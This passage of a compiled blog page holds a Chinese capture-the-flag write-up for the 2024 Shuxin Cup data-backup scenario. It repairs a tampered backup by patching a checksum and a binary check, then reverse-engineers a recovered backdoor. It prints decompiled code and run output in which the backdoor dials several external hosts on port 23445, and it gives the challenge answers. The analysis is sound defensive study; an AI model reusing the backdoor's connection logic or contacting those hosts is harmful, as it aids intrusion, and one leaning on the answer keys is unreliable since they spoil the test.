\u6062\u590d\u88ab\u7834\u574f\u7684\u6e90\u7801\u5907\u4efd\u6587\u4ef6"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u653b\u51fb\u8005\u4fee\u6539\u4e86\u5907\u4efd\u6587\u4ef6\uff0c\u5bfc\u81f4\u67d0\u4e9b\u6587\u4ef6\u65e0\u6cd5\u88ab\u6210\u529f\u6062\u590d\u51fa\u6765\uff08202410311935.cbak \u5df2\u88ab\u653b\u51fb\u8005\u4fee\u6539\uff09\u3002\u8bf7\u9009\u624b\u5206\u6790\u5907\u4efd\u6062\u590d\u7cfb\u7edf\u4e2d\u7684\u5907\u4efd\u6062\u590d\u7a0b\u5e8f myback\uff0c\u7ed3\u5408\u73b0\u6709\u7684\u5907\u4efd\u6587\u4ef6 202410311935.cbak \u4fee\u590d\u5907\u4efd\u6587\u4ef6\uff0c\u4f7f\u4e4b\u80fd\u591f\u6210\u529f\u6062\u590d\u51fa\u6240\u6709\u7684\u6587\u4ef6\uff0c\u5176\u4e2d\u6709\u4e2a\u6587\u4ef6\u5305\u542b\u6709\u5546\u57ce\u95e8\u6237\u7f51\u7ad9\u90e8\u5206\u7684\u6e90\u7801\uff0c\u5c06\u8fd9\u4e2a\u6587\u4ef6\u7684 Md5 \u4f5c\u4e3a\u7b54\u6848\u63d0\u4ea4\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u3010\u7b54\u6848\u6807\u51c6\u3011\u4f8b\uff1a\u82e5\u67d0\u4e2a a.zip \u6587\u4ef6\u4e2d\u5305\u542b\u6709\u5546\u57ce\u6e90\u7801\u6587\u4ef6\uff0c\u5219\u8ba1\u7b97 a.zip \u6587\u4ef6\u7684 32 \u4f4d\u5c0f\u5199 Md5 \u5b57\u7b26\u4e32\u3002\u5c06\u6b64 md5 \u5b57\u7b26\u4e32\u4f5c\u4e3a\u7b54\u6848\u63d0\u4ea4\u3002"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u9996\u5148\uff0c\u5c1d\u8bd5\u76f4\u63a5\u57fa\u4e8e\u539f\u6587\u4ef6\u6267\u884c ",(0,r.jsx)(n.code,{children:"restore"})," \u529f\u80fd"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp/2024sxb-1]\n\u2514\u2500$ ./myback\nMenu:\n1. Backup File\n2. Restore Files\n3. Print Info\n4. Exit\nEnter your choice: 2\nPlease enter the backup file name to be restored:\n202410311935.cbak\nMD5 \u6821\u9a8c\u548c\u4e0d\u5339\u914d\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u90a3\u4e48\u8bf4\u660e\u56e0\u4e3a\u5907\u4efd\u6587\u4ef6\u88ab\u7834\u574f\uff0c\u5bfc\u81f4\u6587\u4ef6\u4e2d\u6240\u8bb0\u8f7d\u7684\u5b8c\u6574\u6027\u6821\u9a8c\u503c\u4e0e\u76ee\u524d\u6587\u4ef6\u7684\u8ba1\u7b97\u7ed3\u679c\u4e0d\u4e00\u81f4"}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u4f7f\u7528 IDA \u8fdb\u884c\u52a8\u8c03"}),"\n",(0,r.jsxs)(n.p,{children:["\u5728 IDA \u4e2d\uff0c\u5bf9 ",(0,r.jsx)(n.code,{children:"restore_files()"})," \u51fd\u6570\u7684 ",(0,r.jsx)(n.code,{children:"if ( !memcmp(stored_md5_sum, calculated_md5_sum, 0x10uLL) )"})," \u8bed\u53e5\u4e0b\u65ad\u70b9"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp/2024sxb-1]\n\u2514\u2500$ ida_linux_server64\nIDA Linux 64-bit remote debug server(ST) v8.3.28. Hex-Rays (c) 2004-2023\n2024-11-09 22:02:17 Listening on 0.0.0.0:23946...\n2024-11-09 22:02:49 [1] Accepting connection from 192.168.200.1...\nMenu:\n1. Backup File\n2. Restore Files\n3. Print Info\n4. Exit\nEnter your choice: 2\nPlease enter the backup file name to be restored:\n202410311935.cbak\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u53ef\u4ee5\u770b\u5230"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(8647).A+"",width:"1563",height:"897"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"stored_md5_sum = EACDD8510B0F54EA412FA900A2F0645F\ncalculated_md5_sum = 85077064C3EB25BDE2EAD27EE50A959C\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u76f4\u63a5\u5bf9 ",(0,r.jsx)(n.code,{children:"cbak"})," \u6587\u4ef6\u7684\u6821\u9a8c\u503c\u8fdb\u884c\u4fee\u6539\uff0c\u7136\u540e\u5c1d\u8bd5\u6267\u884c"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp/2024sxb-1]\n\u2514\u2500$ hexdump 202410311935.patch.cbak -C | head -n 3\n00000000  43 42 41 4b 85 07 70 64  c3 eb 25 bd e2 ea d2 7e  |CBAK..pd..%....~|\n00000010  e5 0a 95 9c 33 2e 38 35  2e 34 68 36 62 61 63 6b  |....3.85.4h6back|\n00000020  75 70 2e 6c 6f 67 00 00  00 00 00 00 00 00 00 00  |up.log..........|\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/tmp/2024sxb-1]\n\u2514\u2500$ ./myback\nMenu:\n1. Backup File\n2. Restore Files\n3. Print Info\n4. Exit\nEnter your choice: 2\nPlease enter the backup file name to be restored:\n202410311935.patch.cbak\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u4e00\u6b21\u6ca1\u6709\u62a5\u9519\u4fe1\u606f\uff0c\u5e76\u5f97\u5230\u4e86\u4ee5\u4e0b\u6587\u4ef6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"-rw-rw-r-- 1 randark randark 2.9K Nov  9 22:20 jz_orders.sql\n-rw-rw-r-- 1 randark randark  36K Nov  9 22:20 jzcms.sql\n-rw-rw-r-- 1 randark randark 1.6K Nov  9 22:20 jzcms2.sql\n-rw-rw-r-- 1 randark randark 2.0K Nov  9 22:20 jzcms3.sql\n-rw-rw-r-- 1 randark randark 1.9K Nov  9 22:20 jzcms4.sql\n-rw-rw-r-- 1 randark randark 3.0K Nov  9 22:20 jzsms1.sql\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4f46\u662f\u5f88\u660e\u663e\uff0c\u8fd9\u91cc\u9762\u5e76\u6ca1\u6709\u6240\u60f3\u8981\u7684\u5e26\u6709\u6e90\u7801\u7684\u538b\u7f29\u6587\u4ef6"}),"\n",(0,r.jsxs)(n.p,{children:["\u5728 ",(0,r.jsx)(n.code,{children:"restore_files()"})," \u51fd\u6570\u7684 ",(0,r.jsx)(n.code,{children:"if ( info_0->filename[0] != 46 )"})," \u90e8\u5206\u4e0b\u65ad\u70b9\uff0c\u67e5\u770b\u6267\u884c\u8fc7\u7a0b"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(53139).A+"",width:"1247",height:"629"})}),"\n",(0,r.jsx)(n.p,{children:"\u7ee7\u7eed Step Into \u67e5\u770b"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(1697).A+"",width:"1231",height:"511"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(30996).A+"",width:"1208",height:"534"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(4287).A+"",width:"1292",height:"560"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(26872).A+"",width:"1275",height:"556"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(66397).A+"",width:"1284",height:"595"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(62730).A+"",width:"1411",height:"749"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(61549).A+"",width:"1214",height:"560"})}),"\n",(0,r.jsxs)(n.p,{children:["\u540c\u65f6\uff0c\u5728\u8c03\u8bd5\u4e2d\uff0c\u53d1\u73b0 ",(0,r.jsx)(n.code,{children:"file_info_count"})," \u53d8\u91cf\u7684\u503c\u4e3a ",(0,r.jsx)(n.code,{children:"8"})," \u4e0e\u6240\u5f97\u5230\u7684 8 \u4e2a\u6587\u4ef6\u7684\u4fe1\u606f\u76f8\u543b\u5408"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(16641).A+"",width:"1259",height:"611"})}),"\n",(0,r.jsx)(n.p,{children:"\u6709\u4e24\u79cd\u529e\u6cd5\uff1a"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"\u57fa\u4e8e\u53cd\u7f16\u8bd1\u7ed3\u679c\uff0c\u89e3\u6790\u51fa\u5907\u4efd\u6587\u4ef6\u7684\u7ed3\u6784\u4f53\u4fe1\u606f\uff0c\u57fa\u4e8e\u7ed3\u6784\u4f53\u4fe1\u606f\u81ea\u52a8\u5316\u8fd8\u539f\u51fa\u6240\u6709\u6587\u4ef6"}),"\n",(0,r.jsx)(n.li,{children:"\u76f4\u63a5\u57fa\u4e8e offset \u4fe1\u606f\uff0c\u5c06\u6587\u4ef6\u624b\u52a8\u4e00\u4e2a\u4e00\u4e2a\u8fd8\u539f\u51fa\u6765"}),"\n",(0,r.jsx)(n.li,{children:"\u5728\u52a8\u8c03\u4e2d\u76f4\u63a5\u83b7\u53d6\u5404\u4e2a\u6587\u4ef6\u89e3\u5bc6\u540e\u7684\u7ed3\u679c"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u7b2c\u4e00\u4e2a\u65b9\u6848\u5f88\u660e\u663e\u6bd4\u8d5b\u65f6\u65f6\u95f4\u6765\u4e0d\u53ca\uff0c\u90a3\u5c31\u53ea\u770b\u4e8c\u3001\u4e09\u65b9\u6848"}),"\n",(0,r.jsx)(n.h3,{id:"\u57fa\u4e8e-offset-\u624b\u52a8\u5904\u7406",children:"\u57fa\u4e8e offset \u624b\u52a8\u5904\u7406"}),"\n",(0,r.jsxs)(n.p,{children:["\u9996\u5148\uff0c\u5f88\u660e\u663e\u4e24\u4e2a\u6587\u4ef6\u7684 filename \u4e3a ",(0,r.jsx)(n.code,{children:"..."})," \u503c\uff0c\u5f88\u660e\u663e\u65e0\u6cd5\u50a8\u5b58\u4e3a\u6b63\u5e38\u7684\u6587\u4ef6\uff0c\u4e8e\u662f\u63d0\u53d6\u4e24\u4e2a\u6587\u4ef6\u7684\u4fe1\u606f"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"file_size = 0x2795B2(2594226) file_offset = 0x1E73(7795)\nfile_size = 0x29BD01(2735361) file_offset = 0x284B4D(2640717)\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u7136\u540e\u76f4\u63a5 Cyberchef \u5904\u7406"}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u770b\u7b2c\u4e00\u4e2a\u6587\u4ef6"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(8703).A+"",width:"2559",height:"1371"})}),"\n",(0,r.jsx)(n.p,{children:"\u5f88\u660e\u663e\u7684 zip \u538b\u7f29\u5305\u6587\u4ef6\uff0c\u8fd9\u91cc\u5176\u5b9e\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u7b54\u6848"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(99971).A+"",width:"2559",height:"1371"})}),"\n",(0,r.jsx)(n.p,{children:"\u7b2c\u4e8c\u4e2a\u6587\u4ef6"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(25364).A+"",width:"2559",height:"1371"})}),"\n",(0,r.jsx)(n.p,{children:"\u5f88\u660e\u663e\u662f ELF \u4e8c\u8fdb\u5236\u6587\u4ef6"}),"\n",(0,r.jsx)(n.h3,{id:"\u57fa\u4e8e\u52a8\u8c03\u62ff\u5230\u6587\u4ef6\u6570\u636e",children:"\u57fa\u4e8e\u52a8\u8c03\u62ff\u5230\u6587\u4ef6\u6570\u636e"}),"\n",(0,r.jsxs)(n.p,{children:["\u5728 ",(0,r.jsx)(n.code,{children:"restore_files()"})," \u51fd\u6570\u7684 ",(0,r.jsx)(n.code,{children:'output_file = fopen(info_0->filename, "wb");'})," \u90e8\u5206\u4e0b\u65ad\u70b9\uff0c\u67e5\u770b\u6267\u884c\u8fc7\u7a0b"]}),"\n",(0,r.jsx)(n.p,{children:"\u7531\u4e8e\u5b58\u5728"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(94610).A+"",width:"1669",height:"733"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"if (info_0->filename[0] != 46 )\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6240\u4ee5\u5728\u6ca1\u6709\u6062\u590d\u6587\u4ef6\u540d\u4fe1\u606f\u4e4b\u524d\uff0c\u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7\u52a8\u8c03\u62ff\u5230\u6587\u4ef6\u6570\u636e"}),"\n",(0,r.jsx)(n.p,{children:"\u6709\u4e00\u4e2a\u529e\u6cd5\uff0c\u5c31\u662f\u5c06\u6587\u4ef6\u540d check \u90e8\u5206\u7684\u903b\u8f91\u8fdb\u884c patch"}),"\n",(0,r.jsx)(n.p,{children:"\u5b9a\u4f4d\u5230"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(28092).A+"",width:"1862",height:"1009"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"if (info_0->filename[0] != 46 )\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u90e8\u5206\u67e5\u770b\u6c47\u7f16"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(34404).A+"",width:"1784",height:"924"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-asm",children:".text:000000000000254B loc_254B:                               ; CODE XREF: restore_files+689\u2193j\n.text:000000000000254B                 mov     eax, [rbp+i]\n.text:0000000000002551                 movsxd  rdx, eax\n.text:0000000000002554                 mov     rax, rdx\n.text:0000000000002557                 shl     rax, 3\n.text:000000000000255B                 add     rax, rdx\n.text:000000000000255E                 shl     rax, 2\n.text:0000000000002562                 mov     rdx, rax\n.text:0000000000002565                 mov     rax, [rbp+file_info_list]\n.text:000000000000256C                 add     rax, rdx\n.text:000000000000256F                 mov     [rbp+info_0], rax\n.text:0000000000002576                 mov     rax, [rbp+info_0]\n.text:000000000000257D                 movzx   eax, byte ptr [rax]\n.text:0000000000002580                 cmp     al, 2Eh ; '.'\n.text:0000000000002582                 jz      loc_2724\n.text:0000000000002588                 mov     rax, [rbp+info_0]\n.text:000000000000258F                 mov     edx, [rax+20h]\n.text:0000000000002592                 mov     rax, [rbp+info_0]\n.text:0000000000002599                 mov     eax, [rax+1Ch]\n.text:000000000000259C                 add     eax, edx\n.text:000000000000259E                 cdqe\n.text:00000000000025A0                 cmp     [rbp+backup_file_size], rax\n.text:00000000000025A7                 jge     short loc_25CC\n.text:00000000000025A9                 mov     rax, [rbp+info_0]\n.text:00000000000025B0                 mov     rsi, rax\n.text:00000000000025B3                 lea     rax, byte_42C0\n.text:00000000000025BA                 mov     rdi, rax        ; format\n.text:00000000000025BD                 mov     eax, 0\n.text:00000000000025C2                 call    _printf\n.text:00000000000025C7                 jmp     loc_2725\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728 ",(0,r.jsx)(n.code,{children:"cmp     al, 2Eh ; '.'"})," \u5904\u6267\u884c ",(0,r.jsx)(n.code,{children:"NOP"})," \u8fdb\u884c\u65e0\u6548\u5316"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(38661).A+"",width:"1865",height:"952"})}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u770b\u53cd\u6c47\u7f16\uff0c\u53ef\u4ee5\u770b\u5230\u903b\u8f91\u5df2\u7ecf\u88ab\u4fee\u6539"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(67592).A+"",width:"1944",height:"1047"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6267\u884c\u5b8c patch \u64cd\u4f5c\u4e4b\u540e\uff0c\u83dc\u5355 ",(0,r.jsx)(n.code,{children:"Edit"})," -> ",(0,r.jsx)(n.code,{children:"Patch program"})," -> ",(0,r.jsx)(n.code,{children:"Apply patches to"})," \u5c06 patch \u540e\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u5bfc\u51fa\u4e3a ",(0,r.jsx)(n.code,{children:"myback.patch"})]}),"\n",(0,r.jsxs)(n.p,{children:["\u5bf9 patch \u540e\u7684 ",(0,r.jsx)(n.code,{children:"myback.patch"})," \u7a0b\u5e8f\u7ee7\u7eed\u52a8\u8c03\uff0c\u65ad\u70b9\u4e0b\u5728\u6587\u4ef6\u5904\u7406\u90e8\u5206\uff0c\u5373\u53ef\u770b\u5230"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(32497).A+"",width:"1376",height:"748"})}),"\n",(0,r.jsxs)(n.p,{children:["\u67e5\u770b ",(0,r.jsx)(n.code,{children:"decrypted_data"})," \u6307\u9488\u6240\u6307\u7684\u5185\u5b58\u533a\u57df"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(22274).A+"",width:"1525",height:"1241"})}),"\n",(0,r.jsx)(n.p,{children:"\u6210\u529f\u57fa\u4e8e\u52a8\u8c03\u83b7\u53d6\u5230\u6587\u4ef6\u5185\u5bb9"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"d64fb691c47bbadbfa4495732cb6d3ae\n"})}),"\n",(0,r.jsx)(n.h2,{id:"5-\u5206\u6790\u540e\u95e8\u6587\u4ef6\u7684\u8fde\u63a5\u5730\u5740",children:"5. \u5206\u6790\u540e\u95e8\u6587\u4ef6\u7684\u8fde\u63a5\u5730\u5740"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u5907\u4efd\u6587\u4ef6\u7ecf\u8fc7\u4fee\u590d\u540e\u5c06\u6240\u6709\u6587\u4ef6\u6210\u529f\u5730\u6062\u590d\u4e86\uff0c\u4f46\u662f\u53d1\u73b0\u6709\u4e00\u4e2a\u672a\u77e5\u7684\u6587\u4ef6\uff0c\u7ecf\u8fc7\u7b80\u5355\u5206\u6790\u540e\uff0c\u786e\u8ba4\u662f\u653b\u51fb\u8005\u7559\u4e0b\u7684\u540e\u95e8\u7a0b\u5e8f\uff0c\u8bf7\u9009\u624b\u5206\u6790\u5907\u4efd\u6062\u590d\u7cfb\u7edf\u4e2d\u7684\u540e\u95e8\u7a0b\u5e8f\uff0c\u786e\u5b9a\u540e\u95e8\u7a0b\u5e8f\u8fde\u63a5\u670d\u52a1\u7684\u5730\u5740 / \u57df\u540d\u548c\u7aef\u53e3\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u3010\u7b54\u6848\u6807\u51c6\u3011\u4f8b\uff1a\u82e5\u5206\u6790\u5f97\u5230\u7684\u540e\u95e8\u670d\u52a1\u7684\u7684 IP \u7684\u4e3a 127.0.0.1 \u6216\u8005\u5206\u6790\u5f97\u5230\u670d\u52a1\u7684\u7684\u57df\u540d\u4e3a mst.com\uff0c\u5bf9\u5e94\u7684\u8fde\u63a5\u7aef\u53e3\u4e3a 1234\uff0c\u5219\u63d0\u4ea4\u7684 \u6848\u4e3a\uff1aIP 127.0.0.1:1234 \u6216\u8005\u57df\u540d mst.com:1234\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u91cc\u7684\u672a\u77e5\u6587\u4ef6\uff0c\u5c31\u662f\u4e0a\u4e00\u9898\u4e2d\u627e\u5230\u7684 elf \u4e8c\u8fdb\u5236\u6587\u4ef6"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(44209).A+"",width:"1084",height:"797"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5bf9\u5176\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u5b9a\u4f4d\u5230 ",(0,r.jsx)(n.code,{children:"main_main()"})," \u51fd\u6570"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(92106).A+"",width:"2560",height:"1540"})}),"\n",(0,r.jsx)(n.p,{children:"\u57fa\u672c\u4e0a\u662f\u4e00\u4e2a\u7f51\u7edc\u901a\u4fe1\u7684\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u6309\u7167\u987a\u5e8f\u91cd\u590d\u5c1d\u8bd5\u4e86\u591a\u4e2a\u670d\u52a1\u5668\uff0c\u5c06\u57fa\u672c\u903b\u8f91\u5757\u63d0\u53d6\u4e00\u4e2a\u51fa\u6765"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'v35.len = 3LL;\nv31.len = (int)"221.67.213.4";\nv31.cap = 12LL;\nv21.str = (uint8 *)&sep;\nv21.len = 1LL;\nv35.str = (uint8 *)"tcp";\nv24 = (io_Writer)runtime_concatstring4(0LL, v35, *(string *)&v31.len, v21, v2);\nv24.tab = (runtime_itab *)runtime_convTstring((string)v24);\n*(_QWORD *)&v17 = &RTYPE_string_0;\n*((_QWORD *)&v17 + 1) = v24.tab;\nv24.data = os_Stdout;\nv24.tab = (runtime_itab *)&go_itab__ptr_os_File_comma_io_Writer;\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6309\u7167\u5757\u7684\u903b\u8f91\uff0c\u4ece\u4e0a\u5f80\u4e0b\u8fdb\u884c\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u6700\u540e\u4e00\u4e2a\u5757\u589e\u52a0\u4e86\u4e00\u6b65\u7f51\u7edc\u8fde\u63a5\u7684\u64cd\u4f5c"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'v31.array = (interface_ *)18;\nv31.len = (int)&sep;\nv31.cap = 1LL;\nv8 = "huben.cimer.com.cn";\nv9 = runtime_concatstring3(0LL, *(string *)&v31.array, *(string *)&v31.len, v7);\nv31.array = (interface_ *)v9.str;\nv31.len = v9.len;\nv27.str = (uint8 *)"tcp";\nv27.len = 3LL;\nv38 = net_Dial(v27, *(string *)&v31.array);\nif (!v38._r1.tab)\n    break;\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u76f4\u63a5\u8fd0\u884c\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5f97\u5230\u4ee5\u4e0b\u8f93\u51fa"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp/2024sxb-1]\n\u2514\u2500$ ./download.elf\ntcp221.67.213.4:23445\ntcp157.24.166.173:23445\ntcpupload.derzse.com:23445\nError connecting: dial tcp: lookup huben.cimer.com.cn on 192.168.200.0:53: no such host\ntcp221.67.213.4:23445\ntcp157.24.166.173:23445\ntcpupload.derzse.com:23445\nError connecting: dial tcp: lookup huben.cimer.com.cn on 192.168.200.0:53: no such host\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u7ed3\u5408\u62a5\u9519\u4fe1\u606f\uff0c\u4ee5\u53ca\u524d\u51e0\u5757\u7684\u8f93\u51fa\u4fe1\u606f\uff0c\u5373\u53ef\u786e\u5b9a\u6700\u540e ",(0,r.jsx)(n.code,{children:"net_Dial()"})," \u53d1\u8d77\u7684\u7f51\u7edc\u8bf7\u6c42\u7684\u5177\u4f53\u8fde\u63a5\u5730\u5740"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"huben.cimer.com.cn:23445\n"})})]})}function d(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(_,{...e})}):_(e)}},28092:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241104-230419-fa23df613f6d8c74b13f19d4d1e425bd.png"},34404:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241105-230540-64b78816c783a894f51fd2261f57374a.png"},8647:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241106-220635-99aef5d3071de9b3dd36f2e2a15a0cab.png"},38661:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241106-230625-790075b2d9faf4dccdce36300d7eeaa5.png"},67592:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241106-230659-f5065a2711beb607d91e61e16f310215.png"},32497:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241111-231121-357ed6d56fb623e9e7e402bfba902fbb.png"},22274:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241111-231153-5c4dff6cfdf7cbb7742f483f90448c26.png"},44209:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241113-231354-a24aaf4b8f0996cd14e200bf8869e0d2.png"},79510:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241116-211626-a2eecc60e1307fc7de371229f85ae3e8.png"},92106:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241116-231633-e1aff744cca401b5ba681327c8e405fc.png"},53139:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241126-222604-829192e3cf99907de7bf9046a7bb6be6.png"},1697:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241126-222620-2db5d217ff371be64792ff5472591cd7.png"},30996:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241126-222632-510786afb2a8b0160d566161a88025f0.png"},4287:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241126-222644-6204952a48793d43bf241926ed8b827c.png"},26872:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241126-222658-95cc762dafa9fd176f17a0352af0276b.png"},66397:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241127-222713-0e8e6936e44e11d952ad5f04c6238702.png"},62730:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241127-222725-cc64b37977b34f00f757eff7a81af6b1.png"},61549:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241127-222739-ef481fc0d3626a575e880229e4b23364.png"},16641:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241128-222827-c738e0756e6e04bece8483699b824e77.png"},8703:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241140-224017-dbcb193eb6e782f20e59ed6737820772.png"},31825:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241141-214129-4254f642abaa2f7bfe030b1758f08738.png"},99971:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241141-224102-2e31f0885c6681cb8906eb4eaf4fa982.png"},25364:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241141-224149-624d93b124555bc3295c153d9572a7e6.png"},94610:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241147-224743-1a7ee576f2331655828d10e7293aaf21.png"},73886:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241157-215724-6a47a339c0b1bec54e87bb67e672d4fd.png"},28453:(e,n,i)=>{i.d(n,{R:()=>a,x:()=>l});var s=i(96540);const r={},c=s.createContext(r);function a(e){const n=s.useContext(c);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),s.createElement(c.Provider,{value:n},e.children)}},36406:e=>{e.exports=JSON.parse('{"permalink":"/Target-Machines-WriteUp/blog/2024sxb Scenario-Race Data-Backup","editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/blog/2024-11-09-2024sxb-Scenario-Race-Data-Backup/index.md","source":"@site/blog/2024-11-09-2024sxb-Scenario-Race-Data-Backup/index.md","title":"2024 \u6570\u4fe1\u676f - \u573a\u666f\u8d5b - \u6570\u636e\u5907\u4efd","description":"2024 \u6570\u4fe1\u676f - \u6570\u636e\u5b89\u5168\u7efc\u5408\u573a\u666f\u8d5b - \u6570\u636e\u5907\u4efd 